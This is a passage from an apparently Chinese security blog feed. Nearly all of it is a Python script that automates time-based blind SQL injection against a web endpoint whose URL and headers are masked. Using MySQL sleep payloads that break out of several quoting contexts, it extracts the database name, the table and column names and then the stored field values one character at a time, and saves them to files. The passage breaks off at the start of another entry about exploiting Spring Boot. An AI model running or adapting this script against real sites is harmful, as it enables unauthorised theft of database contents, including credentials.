class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning,InsecurePlatformWarning<br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)<br>value =<span class="hljs-string">&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data_len</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>        time.sleep(<span class="hljs-number">1</span>)<br>        headers = &#123;<br><br>                <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>                <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br><br>                &#125;<br>        newr=<span class="hljs-string">&quot;&quot;&quot;(select(0)from(select(IF(length(database())=&#123;0&#125;,sleep(5),0)))v)/*&#x27;+(select(0)from(select(IF(length(database())=&#123;0&#125;,sleep(5),0)))v)+&#x27;&quot;+(select(0)from(select(IF(length(database())=&#123;0&#125;,sleep(5),0)))v)+&quot;*/&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        <span class="hljs-comment">#newr=&quot;&quot;&quot;(select(0)from(select(sleep(9)))v)/*&#x27;+(select(0)from(select(sleep(9)))v)+&#x27;&quot;+(select(0)from(select(sleep(9)))v)+&quot;*/&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span> (newr)<br>        payload = newr<br>        url = <span class="hljs-string">&quot;***&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;******&quot;</span>: *** &#125;<br>        <span class="hljs-built_in">print</span> (data)<br>        start_time = time.time()<br>        html = requests.post(url, data=data,headers=headers, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>        end_time = time.time()<br>        use_time = end_time - start_time <span class="hljs-comment">#求出请求前后的时间差来判断是否延时了</span><br>        <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(use_time))<br>        <span class="hljs-keyword">if</span> use_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;...... data&#x27;s length is :&quot;</span>+ <span class="hljs-built_in">str</span>(i)) <br>            <span class="hljs-keyword">return</span> i  <br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">length</span>):</span><br>    <span class="hljs-keyword">global</span> result<br>    headers = &#123;<br><br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br><br>    &#125;<br>    url = <span class="hljs-string">&quot;****&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            time.sleep(<span class="hljs-number">1</span>)<br>            data_payload=<span class="hljs-string">&quot;database()&quot;</span><br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            newr=<span class="hljs-string">&quot;&quot;&quot;(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)/*&#x27;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&#x27;&quot;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&quot;*/&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,n,<span class="hljs-built_in">ord</span>(v))<br>            <span class="hljs-comment">#newr=&quot;&quot;&quot;(select(0)from(select(sleep(9)))v)/*&#x27;+(select(0)from(select(sleep(9)))v)+&#x27;&quot;+(select(0)from(select(sleep(9)))v)+&quot;*/&quot;&quot;&quot;</span><br>            <span class="hljs-built_in">print</span> (newr)<br>            payload = newr            <br>            <span class="hljs-comment">#print (str(payload))</span><br>            data = &#123;<span class="hljs-string">&quot;*&quot;</span>: *&#125;<br>            <span class="hljs-built_in">print</span> (data)<br>            start_time = time.time()<br>            html = requests.post(url, data=data,headers=headers, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(use_time))<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">4</span>:<br>                result += v<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名：&quot;</span>+result)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_biao_data</span>(<span class="hljs-params">length,table_num</span>):</span> <br>    <span class="hljs-comment">#global result</span><br>    headers = &#123;<br><br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br><br>    &#125;<br><br>    url = <span class="hljs-string">&quot;**&quot;</span><br>    table_name_new=<span class="hljs-string">&quot;&quot;</span><br>    biao_flag=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            <span class="hljs-comment">#time.sleep(1)</span><br>            biao_flag=<span class="hljs-number">0</span><br><br>            data_payload=<span class="hljs-string">&quot;(select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(table_num) <span class="hljs-comment">#第几个表名</span><br>            payload = <span class="hljs-string">&quot;&quot;&quot;(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)/*&#x27;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&#x27;&quot;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&quot;*/&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,n,<span class="hljs-built_in">ord</span>(v))<br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;test:&quot;</span>+<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;***&quot;</span>: ***&#125;<br>            start_time = time.time()<br>            html = requests.post(url, data=data,headers=headers, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">4</span>:<br>                table_name_new += v<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第 &quot;</span>+<span class="hljs-built_in">str</span>(table_num)+<span class="hljs-string">&quot; 个表名:&quot;</span>+table_name_new)<br>                biao_flag=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> biao_flag==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> table_name_new<br>    <span class="hljs-keyword">return</span> table_name_new<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data_lie</span>(<span class="hljs-params">length,table_num,lie_num</span>):</span> <span class="hljs-comment">#盲注爆列</span><br>    <span class="hljs-comment">#global result</span><br>    headers = &#123;<br><br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br><br>    &#125;<br><br>    url = <span class="hljs-string">&quot;****&quot;</span><br>    lie_name_new=<span class="hljs-string">&quot;&quot;</span><br>    flag_lie = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            flag_lie = <span class="hljs-number">0</span><br><br>            data_payload=<span class="hljs-string">&quot;(select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(table_num)<br>            <span class="hljs-comment">#爆列ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 13,1) limit 0,1),1,1))=105</span><br>            lie_payload=<span class="hljs-string">&quot;(select column_name from information_schema.columns where table_name=&#123;0&#125; limit &#123;1&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,lie_num)<br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            payload = <span class="hljs-string">&quot;&quot;&quot;(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)/*&#x27;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&#x27;&quot;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&quot;*/&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(lie_payload,n,<span class="hljs-built_in">ord</span>(v))<br><br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;.format(lie_payload,n,ord(v))</span><br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;test:&quot;</span>+<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;***&quot;</span>: ***&#125;<br>            start_time = time.time()<br>            html = requests.post(url, data=data,headers=headers, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-built_in">print</span> (use_time)<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">4</span>:<br>                lie_name_new += v<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第 &quot;</span>+<span class="hljs-built_in">str</span>(table_num)+<span class="hljs-string">&quot; 个表名的第&quot;</span>+<span class="hljs-built_in">str</span>(lie_num)+<span class="hljs-string">&quot;列名:&quot;</span>+<span class="hljs-built_in">str</span>(lie_name_new)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                flag_lie = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <br>        <span class="hljs-keyword">if</span> (flag_lie==<span class="hljs-number">0</span>):<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;1&quot;</span>)<br>            <span class="hljs-keyword">return</span> lie_name_new<br>        <br>    <span class="hljs-keyword">return</span> lie_name_new<br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data_ziduan</span>(<span class="hljs-params">length,ziduan_num,tablet_name_set,lie_name_set</span>):</span><br>    <span class="hljs-comment">#global result</span><br>    headers = &#123;<br><br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;***&#x27;</span>,<br><br>    &#125;<br><br>    url = <span class="hljs-string">&quot;****&quot;</span><br>    ziduan_name_new=<span class="hljs-string">&quot;&quot;</span><br>    ziduan_flag=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            ziduan_flag=<span class="hljs-number">0</span><br><br>            data_payload=<span class="hljs-string">&quot;(select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(lie_name_set,tablet_name_set,ziduan_num)<br>            payload = <span class="hljs-string">&quot;&quot;&quot;(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)/*&#x27;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&#x27;&quot;+(select(0)from(select(IF(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(5),0)))v)+&quot;*/&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,n,<span class="hljs-built_in">ord</span>(v))<br>           <br>            <span class="hljs-comment">#if(ascii(substr((select email from ecs_admin_user limit 0,1),1,1))&lt;68,sleep(0.1),0)</span><br>            <br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;117,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;test:&quot;</span>+<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;***&quot;</span>: **&#125;<br>            start_time = time.time()<br>            html = requests.post(url, data=data,headers=headers, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">4</span>:<br>                ziduan_name_new += v<br>                ziduan_flag=<span class="hljs-number">1</span><br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表&quot;</span>+tablet_name_set+<span class="hljs-string">&quot;的列&quot;</span>+lie_name_set+<span class="hljs-string">&quot;的第 &quot;</span>+<span class="hljs-built_in">str</span>(ziduan_num)+<span class="hljs-string">&quot; 个字段:&quot;</span>+<span class="hljs-built_in">str</span>(ziduan_name_new)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> (ziduan_flag==<span class="hljs-number">0</span>):<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;1&quot;</span>)<br>            <span class="hljs-keyword">return</span> ziduan_name_new<br><br>    <span class="hljs-keyword">return</span> ziduan_name_new<br><br><span class="hljs-comment">#爆数据库</span><br><span class="hljs-comment">#len=get_data_len()</span><br><span class="hljs-comment">#data_name=get_data(11)</span><br><span class="hljs-comment">#f=open(&#x27;result.txt&#x27;,&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="hljs-comment">#f.write(&quot;数据库名字：&quot;+str(database_name))</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">for table_num in range(0,20): #爆20个表</span><br><span class="hljs-string">    tablet_name=get_biao_data(20,table_num)</span><br><span class="hljs-string">    f=open(&#x27;result_table.txt&#x27;,&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="hljs-string">    f.write(&quot;第 &quot;+str(table_num)+&quot; 个表名:&quot;+str(tablet_name)+&#x27;\n&#x27;)</span><br><span class="hljs-string">    f.close()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#爆列</span><br><span class="hljs-string">table_num=7</span><br><span class="hljs-string">for lie_num in range(0,10):</span><br><span class="hljs-string">    lie_name=get_data_lie(20,table_num,lie_num)</span><br><span class="hljs-string">    f=open(&#x27;result_table_lie.txt&#x27;,&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="hljs-string">    f.write(&quot;第 &quot;+str(table_num)+&quot; 个表名的第&quot;+str(lie_num)+&quot;列名:&quot;+str(lie_name)+&#x27;\n&#x27;)</span><br><span class="hljs-string">    f.close()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#爆字段</span><br>tablet_name_set=<span class="hljs-string">&quot;***&quot;</span><br>lie_name_set=<span class="hljs-string">&quot;****&quot;</span><br><span class="hljs-keyword">for</span> ziduan_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    ziduan_name=get_data_ziduan(<span class="hljs-number">35</span>,ziduan_num,tablet_name_set,lie_name_set)<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result_table_lie_ziduan.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    f.write(<span class="hljs-string">&quot;表&quot;</span>+tablet_name_set+<span class="hljs-string">&quot;的列&quot;</span>+lie_name_set+<span class="hljs-string">&quot;的第 &quot;</span>+<span class="hljs-built_in">str</span>(ziduan_num)+<span class="hljs-string">&quot; 个字段:&quot;</span>+<span class="hljs-built_in">str</span>(ziduan_name)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.close()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次渗透一波三折找到的springboot利用</title>
    <link href="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/"/>
